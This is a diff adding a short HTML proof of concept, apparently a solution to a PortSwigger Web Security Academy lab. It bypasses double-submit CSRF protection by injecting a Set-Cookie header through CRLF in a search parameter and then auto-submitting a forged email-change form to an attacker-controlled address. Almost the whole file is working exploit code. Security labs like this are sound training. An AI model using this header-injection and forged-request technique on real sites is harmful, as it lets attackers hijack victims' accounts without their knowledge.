@@ -1,0 +1,11 @@
+<!-- Double submit: App checks that the cookie CSRF and the form CSRF matches.
+No state on server. -->
+<html>
+  <body>
+    <form action="https://ac251fc31f9c6869805c480f00090062.web-security-academy.net/email/change" method="POST">
+      <input required type="hidden" name="csrf" value="myCsrfToken"/>
+      <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <img src="https://ac251fc31f9c6869805c480f00090062.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=myCsrfToken" onerror="document.forms[0].submit()">
+  </body>
+</html>
